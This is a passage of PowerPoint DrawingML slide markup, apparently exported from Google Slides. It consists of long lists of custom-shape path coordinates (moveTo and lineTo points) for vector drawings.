                    <a:pt x="14710" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14894" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15004" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16031" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16251" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16288" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16214" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16141" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15481" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15517" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15517" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15481" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15224" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14894" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6604" y="2788"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6163" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="2788"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13500" y="1945"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13280" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12363" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13757" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14197" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14197" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13280" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13280" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13610" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="1945"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6787" y="4182"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6347" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="4182"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11079" y="2055"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10785" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11446" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11556" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11666" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="2055"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2715" y="1138"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2569" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="845" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="845" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="113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6" name="Google Shape;306;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6336425" y="4507675"/>
              <a:ext cx="520000" cy="365000"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="20800" h="14600" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="5466" y="441"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5650" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="441"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4843" y="478"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4806" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="478"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5173" y="808"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5210" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="2679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="2679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3853" y="3486"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="2495"/>
